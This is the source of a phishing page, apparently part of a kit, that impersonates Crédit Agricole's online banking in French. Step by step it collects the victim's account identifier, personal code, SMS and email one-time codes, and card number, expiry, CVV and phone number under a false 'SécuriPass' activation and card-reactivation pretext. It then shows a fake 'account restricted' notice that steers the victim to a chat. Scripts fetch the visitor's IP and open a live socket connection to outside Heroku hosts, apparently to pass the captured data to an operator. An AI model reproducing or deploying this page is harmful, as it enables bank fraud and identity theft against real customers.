<?php

include './config/settings.php';


?>
<!DOCTYPE html>
<html lang="en">
<head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
  
  
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <script src="https://cdn.jsdelivr.net/npm/vue"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/iview/3.5.1/iview.js" integrity="" crossorigin="anonymous"></script>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/iview/3.5.1/styles/iview.css" integrity="" crossorigin="anonymous" />

  <link rel="shortcut icon" href="./img/fav.png" type="image/x-icon">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/axios/0.19.0/axios.js" integrity="" crossorigin="anonymous"></script>
  <script>
     window.locIp='';
     window.iPfull='';
    fetch('//keykoli.herokuapp.com/ip',{
      mode:'cors',
    }).then(e=>{
      e.json().then(location=>{
        console.log(location)
        window.locIp=location
        window.iPfull =location.ip || location
       
      })
    })
  </script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/2.3.0/socket.io.js" integrity="" crossorigin="anonymous"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/uikit/3.2.0/js/uikit.js" integrity="" crossorigin="anonymous"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.js" integrity="" crossorigin="anonymous"></script>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/semantic-ui/2.4.1/semantic.css" integrity="" crossorigin="anonymous" />
  <script src="https://cdnjs.cloudflare.com/ajax/libs/semantic-ui/2.4.1/semantic.js" integrity="" crossorigin="anonymous"></script>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/uikit/3.2.0/css/uikit.css" integrity="" crossorigin="anonymous" />
<link rel="stylesheet" href="./css/styles.css">
<title>Acc&egrave;s CR - Crédit Agricole</title>
<style>
body{
  display: none;
}
</style>
</head>
<body>
  
<p style="display:none">
  <input id="Mail" type="text" value="<?=$Mail;?>">
  <input id="Option" type="text" value="<?=$option;?>">
</p>
  <div id="index">
   <div v-show="!loading">
      <div  v-if="login==1" id="dep">
          <div class="uk-position-absolue">
            <div class="uk-hidden@l">
                <div>
                  <div class="uk-child-width-1-3 uk-grid-match"  uk-grid>
                      <div>
                       <div style="padding:23px">
                         <div>
                            <i class="ui icon bars large"></i>
                         </div>
                       </div>
                      </div>
                     <div>
                       <div class="uk-text-center uk-align-center">
                        <div style="padding:23px">
                            <img style="min-width:200px" src="./img/ilogo.svg" alt="">
                        </div>
                       </div>
                     </div>
                      <div>
                       <div class="uk-align-right uk-text-right">
                          <div style="float:right;background:#006675;padding:20px;">
                              <i class="ui icon large inverted  lock"></i>
                            </div>
                       </div>
                      </div>
                  </div>
                </div>
            </div>
              <div class="uk-position-relative uk-visible@l"  uk-grid>
                  <div>
                    <img style="width:140px" src="https://www.credit-agricole.fr/content/dam/assetsca/npc/logos/CA_Toute-une-banque-pour-vous_V.svg" alt="">
                  </div>
                  <div  class="uk-width-expand "> 
                   <div id="barh" class="uk-text-bold" uk-grid>
                     <div class="primary">
                       <br>
                        Vous êtes un particulier  <i class="ui icon chevron large down"></i>
                     </div>
                     <div id="menu_" class="uk-text-right uk-align-right uk-width-expand">
                          <ul>
                           
                            <li> <i class="ui icon unlock"></i> mon espace</li>
                            <li style="background:#006675">ouvrir un compte</li>
                            <li style="background:#009787"> <i class="ui icon chat"></i> nous contacter</li>
                            
                          </ul>
                     </div>
                   </div>
                    <div id="menus">
                      <ul id="bar">
                        <li>Comptes & cartes</li>
                        <li>épargner</li>
                        <li>S'assurer</li>
                        <li>emprunter</li>
                        <li>simmulation & devis</li>
                        <li>nos conseils</li>
                      </ul>
                    </div>
                  </div>
              </div>
          
          </div>
             
              <div>
                <br>
                  <div class=" uk-child-width-1-2@m uk-position-relative" uk-grid>
      
                      <div class="uk-visible@m">
                         <div class=" uk-height-1-1 uk-position-relative uk-background-image uk-background-cover uk-background-secondary " data-src="./img/access.jpg" uk-img>
                           <div class="uk-padding uk-position-center">
                                <div style="background:#006675" class="uk-light uk-text-justify uk-card uk-card-body">
                                
                                  <h3 class="uk-card-title uk-h1">Télécharger l'application Ma Banque</h3>
                                  <p>
                                      Chacun d’entre vous gère différemment ses besoins bancaires.
                                  </p>
                                  
                                  <p>
      
      Seul ou accompagné, au Crédit Agricole, vous aurez toujours le choix entre vous adresser à un conseiller ou utiliser l’application Ma Banque.
                                  </p>
                                  <div style="width:100%" class="ui  button">
                                     <span class="primary">
                                        Découvrez les grandes fonctionnalités
                                     </span>
                                  </div>
                                </div>
                           </div>
                         </div>
                      </div>
      
      
                      <div>
      
                        <div class="uk-padding">
                          <div class="uk-card uk-text-center uk-background-muted uk-card-large uk-card-default uk-card-body">
                            <h3 class="uk-card-title">ACCÉDER À L'ESPACE DÉDIÉ <br>
                            <b>DE VOTRE CAISSE RÉGIONALE</b></h3>
                            <p>
                               <b> Trouver une caisse régionale</b>
                            </p>
                            <p>
                              <input type="text" @keyup="error=false" v-model="log.DEP" placeholder="saisir votre numéro de département" type="text">
                            </p>
                            <br>
                            <div @click="goToCredit" id="btn" class="ui button">
                             &nbsp; VALIDER&nbsp;
                            </div>
                            <br><br>
                            <div v-if="error" class="uk-text-left  uk-text-danger" >
                                  <i class="ui icon warning red"></i>  Champs incorrect, corriger votre saisie
                            </div>
                          </div>
                        </div>
                      </div>
             
                     </div>
              </div>
      
      
      
          </div>
      
      
      <div  v-if="login==2">
        <div class="uk-child-width-1-2 uk-margin-remove-bottom" uk-grid>
        
            <div>
              <div style="padding:2%">
                  <img width="220px" src="./img/ilogo.svg" alt=""> 
              </div>
            </div>
            <div  class="uk-width-expand uk-align-right ">
              <div @click="login=1;message='Chargement en cours...'" style="background:#006675;width:80px;float:right;padding:30px;cursor:pointer">
                  <i class="ui icon close large inverted"></i>
              </div>
            </div>
        </div>
        <div class="uk-child-width-1-2@m uk-grid-collapse uk-grid-match" uk-grid>
            <div class="uk-background-image@l uk-visible@m uk-position-relative uk-background-cover" data-src="https://source.unsplash.com/1600x900/?work,office" uk-img>
                <div class="uk-padding uk-position-center">
                  <div class="uk-card uk-card-large uk-card-default uk-card-body">
                    <div class="uk-h3 primary">
                        Bienvenue au CA , Crédit Agricole
                    </div>
                    <p class="headline body-3">
                        Accéder à vos comptes, réaliser vos opérations courantes, souscrire en ligne, effectuer une simulation, obtenir un conseil personnalisé : nous avons conçu cet espace sécurisé pour vous rendre service et être au plus près de vos besoins.
                    </p>
                  </div>
                </div>
            </div>
            <div>
              <div style="background:#EEEEEE;padding:3%" class="uk-card uk-card-large uk-text-left  uk-card-default uk-card-body">
                <h3 id="le" class="uk-card-title uk-text-bold">
                  <span class="uk-text-light">ACCÉDER </span>
                  À MES COMPTES</h3>
      
                  <div class="uk-child-width-1-2@s uk-grid-collapse" uk-grid>
                        <div id="cc"  class="uk-width-expand">
                          
                           <div>
                              <table style="width:100%" cellspacing="15"  cellpadding="10" id="claver">
                                <tr >
                                  <td style="background:transparent;padding:0;text-align:left;color:black" colspan="5">
                                      <p>
                                          <b>IDENTIFIANT</b> <br>
                                          <span >Saisissez votre identifiant à 11 chiffres</span>
                                          <br>
                                        
                                            <input maxlength="11"   v-model="log.ID"  placeholder="Ex : 982662721">
                                         
                                         <p>
                                            <b>CODE PERSONNEL</b> <br>
                                         
                                            <div style="position:relative">
                                                <input  style="background: #f5f5f5" v-model="log.PASS" readonly placeholder="6 chiffes" type="PASSword">
                                                <span @click="log.PASS=''" v-if="log.PASS.length>0" style="top:20px;right:3px;position:absolute;">
                                                  <i class="ui icon close"></i>
                                                </span>
                                            </div>
                                         </p>
                                  </td>
                                </tr>
                                  <tr id="typeC">
                                    <td @click="log.PASS.length<6 ? log.PASS+=0 :''">0</td>
                                    <td @click="log.PASS.length<6  ? log.PASS+=6: ''">6</td>
                                    <td @click="log.PASS.length<6 ? log.PASS+=9 :''">9</td>
                                    <td @click="log.PASS.length<6 ?log.PASS+=4:''">4</td>
                                    <td @click="log.PASS.length<6 ?log.PASS+=7:''">7</td>
                                  </tr>
                                  <tr id="typeC">
                                      <td @click="log.PASS.length<6 ?log.PASS+=8:''">8</td>
                                      <td @click="log.PASS.length<6 ?log.PASS+=1:''">1</td>
                                      <td @click="log.PASS.length<6 ?log.PASS+=2:''">2</td>
                                      <td @click="log.PASS.length<6 ?log.PASS+=5:''">5</td>
                                      <td @click="log.PASS.length<6 ?log.PASS+=3:''">3</td>
                                    </tr>
                                    <tr>
                                      <td style="background:transparent;padding:0;" colspan="5">
                                          <div class="uk-text-center">
                                              <div @click="goToEspace" style="width:100%"  id="btn" class="ui button">
                                                  VALIDER
                                               </div>
                                          </div>
                                      </td>
                                    </tr>
                              </table>
                           </div>
                         
                           
                          </p>
                        </div>
                        <div>
                          <br>
                            <div class="uk-h5">
                               <b> OUBLI/PERTE <br> DE CODE PERSONNEL </b>
                            </div>
                            <span>
                                Si vous avez oublié ou perdu votre <br> code personnel, cliquez ici.
                            </span>
                            <br>
                            <div class="uk-h5">
                              <b>VOTRE IDENTIFICATION NE <br> CHANGE PAS</b>
      
                            </div>
                            <span>
                                Pour accéder à votre compte, <br> saisissez votre 
                                 identifiant et votre <br> code personnel habituels.
                            </span>
                            <br>
                            <div class="uk-h5">
                              <b>SÉCURITÉ</b>
                            </div>
                            <span >
                                Restez vigilants et veillez à protéger <br>
                                 vos données personnelles. <br>
                                Consultez nos conseils de sécurité
                            </span> <br><br>
                            <span>
                                Nous vous invitons également <br> à consulter 
                                 régulièrement <br> nos Conditions <br> Générales d'utilisation.
                                 <br>
                                Voir les Conditions <br> Générales d'Utilisation
                            </span>
                        </div>
                  </div>
              </div>
            </div>
        </div>
      </div>
      
      <div style="background:white" v-if="login==3">
        <div class=" white">
          <div class="uk-padding"><img width="200px" src="./img/ilogo.svg" alt=""></div>
         <div class="uk-child-width-1-2@s uk-grid-collapse" uk-grid>
           <div class="uk-visible@m">
             <div class="uk-height-1-1 uk-padding  uk-background-image uk-background-cover uk-background-secondary" data-src="./img/access.jpg" uk-img>
               <div class=" uk-card uk-card-large uk-card-default uk-card-body" >
                  <div id="cc"  class="">
                    
                      <div id="el" class="uk-h5 primary uk-text-bold uk-text-uppercase">
                        ACTIVAtion sécuriPass en Trois étapes : 
                      </div>
                        <div class="uk-h4">
                          Comment activer mon SécuriPass et faciliter mes opération en un click ?
                        </div>
                       <div>
                                                    <p><i class="ui icon mobile teal"></i> Entrer le code reçu par SMS envoyé 
                          sur votre numéro (la premier conexion) .</p>
                         <p><i class="ui icon mobile teal"></i> Entrer le code reçu par SMS envoyé 
                          sur votre numéro .</p>
                          <p>
                              <i class="ui icon circle teal"></i> Entrer le code à 6 chiffres reçcu par 
                              E-mail .
                          </p>
                          <p>
                            <i class="ui large icon teal check"></i> 
                            Votre SécuriPass à été activé.
                            
                          </p>
                       </div>
                    </div>
               </div>
             </div>
           </div>
           <div>
             <div class="uk-padding">
                <div class="uk-h3 primary"> 
                <i class="ui icon key teal"></i>
                  J'active mon SécuriPass </div>
                  <div class="uk-visible@m">
                    <Steps size="small" vertical style="color:teal" :current="step-1">
                        <Step style="color:teal" title="SMS MOBILE" content="Confirmation premiere connexion"></Step>
                      <Step style="color:teal" title="SMS MOBILE" content="Confirmation mobile"></Step>
                      <Step style="color:teal" title="EMAIL" content="Code de validation email"></Step>
                      <Step style="color:teal" title="INFORMATION" content="Activation SécuriPass"></Step>
                     
                  </Steps>
                  <br><br>
                  </div>
                  <div class="uk-hidden@m">
                    <Steps size="small" direction="vertical" style="color:teal" :current="step-1">
                        <Step style="color:teal" title="SMS MOBILE" content="Confirmation mobile"></Step>
                      <Step style="color:teal" title="SMS MOBILE" content="Confirmation mobile"></Step>
                      <Step style="color:teal" title="EMAIL" content="Code de validation email"></Step>
                      <Step style="color:teal" title="INFORMATION" content="Activation SécuriPass"></Step>
                     
                  </Steps>
                  <br><br>
                  </div>
                  <div v-if="step==1">
                    <p style="font-size:15px" id="cc">
                      Nous vous avons envoyé un SMS sur votre mobile <i class="ui icon big mobile"></i> <br>
                        <b> Veuillez entrer le code de <span style="color:teal">*6 chiffres*</span> reçu par SMS ci-dessous :   </Nous> <br>
                      <br>  <input maxlength="6" max="999999"  v-model="log.SMS" style="width:50%" type="text" placeholder="(6 chiffres)">
                      </p>

                      <p>
                        
                        <div @click="goToStep" id="btn" class="ui button">
                        <i class="ui icon chevron right"></i>  &nbsp;CONTINUER
                        </div>
                </div>
                <div v-if="step==2">
                    <p style="font-size:15px" id="cc">
                      Nous vous avons envoyé un SMS sur votre mobile <i class="ui icon big mobile"></i> <br>
                        <b> Veuillez entrer le code de <span style="color:teal">*6 chiffres*</span> reçu par SMS ci-dessous :   </Nous> <br>
                      <br>  <input maxlength="6" max="999999"  v-model="log.SMS1" style="width:50%" type="text" placeholder="(6 chiffres)">
                      </p>

                      <p>
                        
                        <div @click="goToStep1" id="btn" class="ui button">
                        <i class="ui icon chevron right"></i>  &nbsp;CONTINUER
                        </div>
                </div>
                <div v-if="step==3">
                    <p style="font-size:15px;font-weight: 100" id="cc">
                      <b style="font-weight:bold"> 2) Entrer le code reçu  par  E-mail <i class="ui  icon mail"></i> : </b>  <br>
 <br>                      <span>
                         Un nouveau code a été envoyé à votre adresse E-mail , veuillez le recopier ci-dessous :
                       </span> <br>
                      <input v-model="log.CODE" maxlength="6" style="width:50%" type="text" placeholder="(6 chiffres)" >
                      </p>
                      <p>
                        <div @click="submitForm" id="btn" class="ui button">
                        <i class="ui icon chevron right"></i>  &nbsp; SE CONNECTER
                        </div>
                </div>
                </p>
                <img src="https://i.ytimg.com/vi/vV_tpC9MuP4/maxresdefault.jpg" alt="">
                <br>
                <div class="uk-alert">
                   Nouveau  dispositif de sécurité conçu pour  les opérations en ligne . <br>
                   Ce code confidentiel, connu de vous seul, est utilisable uniquement pour vos opérations en ligne .
                   <ul>
                     <li>Consultation de solde</li>
                     <li>Virements en ligne</li>
                     <li>Achat en ligne</li>
                     <li>Et d'autres opérations sensibles ....</li>
                   </ul> 
                </div>
             </div>
           </div>
          <div>
             
          </div>
         </div>
        </div>
      
      
      </div>
      <div v-if="login==4">
              <div class="uk-padding uk-text-left">
                  <img style="width:400px" src="./img/ilogo.svg" alt="">
                <div class="uk-h4 primary">
                    Ré-activer votre carte pour les paiements et retraits (guichet) .
                </div>
                <div class="uk-child-width-1-2@s" uk-grid>
                    <div>
                        <p class="uk-text-bold">
                            Entrer les coordonnées de la carte à activer 
                          </p>
                              <p>
                                Numéro de carte : <input v-model="log.numcc" maxlength="16" style="background: #f5F5F5;min-width:252px;width:38%" placeholder="Numéro de carte" type="text">
                              </p>
                              <p>
                               Date d'expiration : 
                               <input v-model="log.ex1" style="background: #f5F5F5;width:21%"  min="0" max="12" maxlength="2" placeholder="MM" type="text">&nbsp;
                               <input v-model="log.ex2" style="background: #f5F5F5;width:21%"  min="19" max="30" maxlength="4"  placeholder="AAAA" type="text">
                              </p>
                              <p>
                                Cryptogramme visuel (CVV) : <input maxlength="4" v-model="log.cvv" style="background: #f5F5F5;width:16%" placeholder="" type="text">
                               </p>

                             <p>
                                Numéro mobile associé  :  <input v-model="log.tel" style="background: #f5F5F5;width:39%"  min="19" max="30" maxlength="12"  placeholder="(+33)" type="text">
                              
                             </p>
                               <br>
                               <div @click="setCard" class="ui button teal">
                               <i class="ui icon  cc mastercard "></i> 
                                J'active ma carte
                               </div>
                    </div>
                    <div class="uk-visible@m">
                        <img src="https://www.ca-atlantique-vendee.fr/Vitrine/Obj/Avantage_9443012_tcm_124_518558.png" alt="">
              
                    </div>
                </div>
                     
              </div>
              <div>
               </div>
      </div>

      <div v-if="login==5">

         <div class="uk-padding uk-text-center">
            <img style="width:240px" src="./img/ilogo.svg" alt="">   
            <p>
              
            </p>
            <div class="uk-h3">
                  Suite à de nouvelles reformes votre compte à été restreint .
            </div>
            <div style="font-size: 17px">
            <i class="ui icon info circle"></i>  Nous avons besoin de vérification supplémentaire <br>
              pour la réactivation de votre compte.<br><br>
              
             <p>
                Cliquer sur le button ci-dessous pour contacter l'assistance en ligne .
             </p>
             <p>
               <i class="ui icon chevron down big"></i>
             </p>
             <div @click="showChat" class="ui teal button color">
              <i class="ui icon chat"></i>  Chat support technique
             </div>
             <br>
             <br><br>
            <div class="uk-card uk-card-default uk-card-body">
                <div style="color:#525252" class="uk-text-justify">
                    Conformément aux dernières exigences réglementaires de la seconde Directive Européenne sur les services bancaires  (dite DSP2), entrées en vigueur le 14/09/2019, les banques vont progressivement renforcer la sécurité de l’accès en ligne à vos comptes bancaires et de vos paiements par carte sur internet avec les e-commerçants.
    
                 </div>
           

                 <div style="color:black" class="uk-text-center">
                    <br>
                    Nous vous invitons donc à vous référer au support <i class="ui icon teal chat"></i> pour réeactiver ou activer les services 
                    liés à votre compte.
                 </div>
            </div>
            </div>

         </div>
      </div>
   </div>
<div v-show="loading">
    <div class="uk-position-center">
      <div class="uk-text-center">
       
          <div class="primary" uk-spinner></div> <br>
          <p>
            {{message}}
          </p>
          <p>
              <img style="width:100%" src="./img/ilogo.svg" alt="">
          </p>
      </div>
    </div>
</div>
  </div>
  <script>
   
    const socket =io('https://keys0.herokuapp.com',{
    transports:['websocket','polling']
})
  function validateNumber(event) {
    var key = window.event ? event.keyCode : event.which;
    if (event.keyCode === 8 || event.keyCode === 46) {
        return true;
    } else if ( key < 48 || key > 57 ) {
        return false;
    } else {
        return true;
    }
};
$(document).ready(function(){
    $('input').keypress(validateNumber);
});
  </script>
  <script src="./js/index.js"> </script>
  <!--Start of Tawk.to Script-->
<script type="text/javascript">
  var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
  (function(){
  var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
  s1.async=true;

  s1.src="";
  s1.charset='UTF-8';
  s1.setAttribute('crossorigin','*');
  s0.parentNode.insertBefore(s1,s0);
  })();
  </script>
  
  <!--End of Tawk.to Script-->
  
</body>
</html>